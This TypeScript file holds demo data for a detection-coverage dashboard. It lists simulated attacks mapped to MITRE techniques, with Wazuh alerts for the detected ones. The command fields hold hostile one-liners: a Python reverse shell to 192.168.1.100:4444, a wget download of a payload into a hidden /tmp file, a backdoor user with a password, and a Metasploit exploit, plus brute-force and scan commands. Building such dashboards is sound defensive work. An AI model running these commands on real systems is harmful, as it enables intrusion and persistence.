// Demo data for Coverage page

type Severity = "LOW" | "MEDIUM" | "HIGH" | "CRITICAL";
type MissReason = "NO_RULE" | "TIMEOUT";

export const DEMO_KPI = {
  coverage: 58,
  totalAttacks: 12,
  detectedAttacks: 7,
  missedAttacks: 5,
  mttdAvg: 48,
  exerciseDuration: "28m",
};

export const DEMO_MISSED = [
  {
    id: "ATK-03",
    time: "14:08:15",
    tool: "sudo",
    technique: "T1548",
    techniqueName: "Privilege Escalation",
    attempts: 5,
    missReason: "NO_RULE" as MissReason,
    command: "sudo -l && sudo su root",
    targetIp: "10.0.0.4",
    sourceIp: "192.168.1.100",
  },
  {
    id: "ATK-06",
    time: "14:12:33",
    tool: "metasploit",
    technique: "T1190",
    techniqueName: "Exploit Public Application",
    attempts: 2,
    missReason: "NO_RULE" as MissReason,
    command: "use exploit/unix/webapp/php_include; set RHOST 10.0.0.5; run",
    targetIp: "10.0.0.5",
    sourceIp: "192.168.1.100",
  },
  {
    id: "ATK-08",
    time: "14:16:45",
    tool: "useradd",
    technique: "T1136",
    techniqueName: "Create Account — Backdoor",
    attempts: 1,
    missReason: "TIMEOUT" as MissReason,
    timeoutDelay: "+7m 12s",
    command:
      "useradd -m -s /bin/bash backdoor && echo 'backdoor:p4ss' | chpasswd",
    targetIp: "10.0.0.4",
    sourceIp: "192.168.1.100",
  },
  {
    id: "ATK-11",
    time: "14:22:10",
    tool: "python3",
    technique: "T1059",
    techniqueName: "Command & Script Interpreter",
    attempts: 3,
    missReason: "NO_RULE" as MissReason,
    command:
      "python3 -c 'import socket,os,pty;s=socket.socket();s.connect((\"192.168.1.100\",4444))'",
    targetIp: "10.0.0.4",
    sourceIp: "192.168.1.100",
  },
  {
    id: "ATK-14",
    time: "14:27:55",
    tool: "wget",
    technique: "T1105",
    techniqueName: "Ingress Tool Transfer",
    attempts: 2,
    missReason: "TIMEOUT" as MissReason,
    timeoutDelay: "+4m 38s",
    command:
      "wget http://192.168.1.100:8080/payload.sh -O /tmp/.payload && chmod +x /tmp/.payload",
    targetIp: "10.0.0.4",
    sourceIp: "192.168.1.100",
  },
] as const;

export const DEMO_DETECTED = [
  {
    id: "ATK-01",
    time: "14:00:00",
    tool: "nmap",
    technique: "T1046",
    techniqueName: "Network Service Scanning",
    delaySeconds: 45,
    command: "nmap -sS -sV -O 10.0.0.0/24",
    sourceIp: "192.168.1.100",
    targetIp: "10.0.0.0/24",
    alert: {
      id: "ALR-01",
      ruleId: "40101",
      ruleName: "Network Scanner Detected",
      severity: "MEDIUM" as Severity,
      time: "14:00:45",
      agent: "wazuh-agent-01",
      description:
        "Port scanning from 192.168.1.100 targeting subnet 10.0.0.0/24. TCP SYN flood signature. 1,247 packets over 38s.",
    },
  },
  {
    id: "ATK-02",
    time: "14:01:55",
    tool: "hydra",
    technique: "T1110",
    techniqueName: "Brute Force — SSH",
    delaySeconds: 15,
    command: "hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://10.0.0.4",
    sourceIp: "192.168.1.100",
    targetIp: "10.0.0.4",
    alert: {
      id: "ALR-02",
      ruleId: "5710",
      ruleName: "Multiple Failed SSH Logins",
      severity: "HIGH" as Severity,
      time: "14:02:10",
      agent: "wazuh-agent-02",
      description:
        "847 SSH failures from 192.168.1.100 in 60s. Brute-force confirmed.",
    },
  },
  {
    id: "ATK-04",
    time: "14:09:30",
    tool: "gobuster",
    technique: "T1083",
    techniqueName: "File & Directory Discovery",
    delaySeconds: 88,
    command:
      "gobuster dir -u http://10.0.0.5 -w /usr/share/wordlists/dirbuster/big.txt",
    sourceIp: "192.168.1.100",
    targetIp: "10.0.0.5",
    alert: {
      id: "ALR-04",
      ruleId: "31101",
      ruleName: "Web Scanner — Directory Enumeration",
      severity: "MEDIUM" as Severity,
      time: "14:10:58",
      agent: "wazuh-agent-03",
      description:
        "3,400+ path requests on Apache access.log from 192.168.1.100. Directory bruteforcing confirmed.",
    },
  },
  {
    id: "ATK-05",
    time: "14:11:00",
    tool: "nikto",
    technique: "T1595",
    techniqueName: "Active Scanning — Nikto",
    delaySeconds: 32,
    command: "nikto -h http://10.0.0.5 -C all -Tuning 123bde",
    sourceIp: "192.168.1.100",
    targetIp: "10.0.0.5",
    alert: {
      id: "ALR-05",
      ruleId: "31106",
      ruleName: "Vulnerability Scanner Signature",
      severity: "HIGH" as Severity,
      time: "14:11:32",
      agent: "wazuh-agent-03",
      description:
        "Nikto User-Agent fingerprint in HTTP headers. CVE probing against 10.0.0.5 web services.",
    },
  },
  {
    id: "ATK-07",
    time: "14:14:20",
    tool: "nmap",
    technique: "T1046",
    techniqueName: "Network Service Scanning — UDP",
    delaySeconds: 28,
    command: "nmap -sU --top-ports 200 --open 10.0.0.0/24",
    sourceIp: "192.168.1.100",
    targetIp: "10.0.0.0/24",
    alert: {
      id: "ALR-07",
      ruleId: "40102",
      ruleName: "UDP Port Scan Detected",
      severity: "MEDIUM" as Severity,
      time: "14:14:48",
      agent: "wazuh-agent-01",
      description: "UDP scanning from 192.168.1.100, top 200 ports.",
    },
  },
  {
    id: "ATK-09",
    time: "14:18:00",
    tool: "sqlmap",
    technique: "T1190",
    techniqueName: "SQL Injection Attempt",
    delaySeconds: 105,
    command:
      "sqlmap -u 'http://10.0.0.5/login.php?id=1' --dbs --level=5 --risk=3",
    sourceIp: "192.168.1.100",
    targetIp: "10.0.0.5",
    alert: {
      id: "ALR-09",
      ruleId: "31151",
      ruleName: "SQL Injection — Blind Boolean",
      severity: "CRITICAL" as Severity,
      time: "14:19:45",
      agent: "wazuh-agent-03",
      description:
        "SQLMap blind boolean payloads in /login.php params. MySQL 5.7 fingerprinted.",
    },
  },
  {
    id: "ATK-10",
    time: "14:20:45",
    tool: "hydra",
    technique: "T1110",
    techniqueName: "Brute Force — FTP",
    delaySeconds: 22,
    command: "hydra -L users.txt -P passwords.txt -t 16 ftp://10.0.0.4",
    sourceIp: "192.168.1.100",
    targetIp: "10.0.0.4",
    alert: {
      id: "ALR-10",
      ruleId: "5701",
      ruleName: "Multiple Failed FTP Logins",
      severity: "HIGH" as Severity,
      time: "14:21:07",
      agent: "wazuh-agent-02",
      description: "FTP brute-force: 312 failures in 18s.",
    },
  },
] as const;

export const DEMO_MTTD_AREA = [...DEMO_DETECTED]
  .sort((a, b) => a.time.localeCompare(b.time))
  .map((d) => ({
    time: d.time.slice(0, 5),
    delay: d.delaySeconds,
    tool: d.tool,
    id: d.id,
  }));

export const DEMO_TOOL_FLAT = [
  { name: "sudo", attacks: 5, detected: 0, rate: 0 },
  { name: "python3", attacks: 3, detected: 0, rate: 0 },
  { name: "metasploit", attacks: 2, detected: 0, rate: 0 },
  { name: "wget", attacks: 2, detected: 0, rate: 0 },
  { name: "useradd", attacks: 1, detected: 0, rate: 0 },
  { name: "nmap", attacks: 2, detected: 2, rate: 100 },
  { name: "hydra", attacks: 2, detected: 2, rate: 100 },
  { name: "nikto", attacks: 1, detected: 1, rate: 100 },
  { name: "gobuster", attacks: 1, detected: 1, rate: 100 },
  { name: "sqlmap", attacks: 1, detected: 1, rate: 100 },
] as const;

export const DEMO_SEVERITY_PIE = (
  "CRITICAL HIGH MEDIUM LOW".split(" ") as Array<Severity>
)
  .map((severity) => ({
    severity,
    count: DEMO_DETECTED.filter((attack) => attack.alert.severity === severity)
      .length,
  }))
  .filter((entry) => entry.count > 0);

export const DEMO_TOOL_POLAR = [...DEMO_TOOL_FLAT]
  .sort(
    (a, b) =>
      b.attacks - a.attacks || b.rate - a.rate || a.name.localeCompare(b.name),
  )
  .slice(0, 5)
  .map((tool) => ({
    ...tool,
    angle: 1,
    missed: Math.max(tool.attacks - tool.detected, 0),
  }));
